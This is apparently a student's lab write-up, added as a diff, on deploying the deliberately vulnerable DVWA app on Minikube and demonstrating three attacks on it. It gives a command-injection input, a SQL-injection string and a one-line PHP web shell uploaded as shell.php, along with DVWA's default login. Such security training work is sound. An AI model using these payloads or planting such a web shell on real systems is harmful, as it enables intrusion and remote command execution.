@@ -1,0 +1,79 @@
+# DVWA Deployment & Attack Demonstration – AccuKnox Assignment
+
+## ✅ Kubernetes Setup using Minikube
+
+1. Installed Minikube on Ubuntu 24.04:
+   - Downloaded using curl
+   - Installed using `sudo install minikube-linux-amd64 /usr/local/bin/minikube`
+
+2. Started Minikube with limited memory due to system constraints:
+   - Command used: `minikube start --driver=docker --memory=2200mb`
+
+3. Verified Kubernetes is running:
+   - Used `kubectl get nodes`
+   - Node status was "Ready"
+
+---
+
+## ✅ DVWA Deployment on Kubernetes
+
+1. Created `dvwa.yaml` to define Kubernetes Service & Deployment
+   - Used image: `vulnerables/web-dvwa`
+
+2. Applied the YAML:
+   - Command: `kubectl apply -f dvwa.yaml`
+
+3. Verified pod status:
+   - Command: `kubectl get pods` → STATUS = Running
+
+4. Exposed the DVWA service:
+   - Command: `minikube service dvwa`
+   - Accessed app in browser via the NodePort URL
+
+---
+
+## 🔒 DVWA Configuration for Testing
+
+1. Logged in using:
+   - Username: `admin`
+   - Password: `password`
+
+2. Set DVWA security level to "Low"
+
+---
+
+## 🚨 Demonstrated 3 Attacks
+
+### 1. 🧪 Command Injection
+- Path: DVWA → Command Execution
+- Input used: `127.0.0.1; ls`
+- Result: Output showed files listed, confirming command injection
+
+### 2. 🧪 SQL Injection
+- Path: DVWA → SQL Injection
+- Input used: `1' OR '1'='1`
+- Result: Multiple user records were shown — confirming SQL Injection
+
+### 3. 🧨 Command Execution via File Upload
+- Path: DVWA → File Upload
+- Uploaded File: `shell.php` with code:
+  ```php
+  <?php system($_GET['cmd']); ?>
+
+Screenshots
+
+Included screenshots for each of the 3 attacks in the PDF:
+
+    command-injection.png
+
+    sql-injection.png
+
+    file-upload-shell.png
+
+Files Attached
+
+    dvwa.yaml — Kubernetes configuration file
+
+    steps.txt — This file describing the entire process
+
+    dvwa-kubernetes-attack-report.pdf — All 3 attacks with screenshots
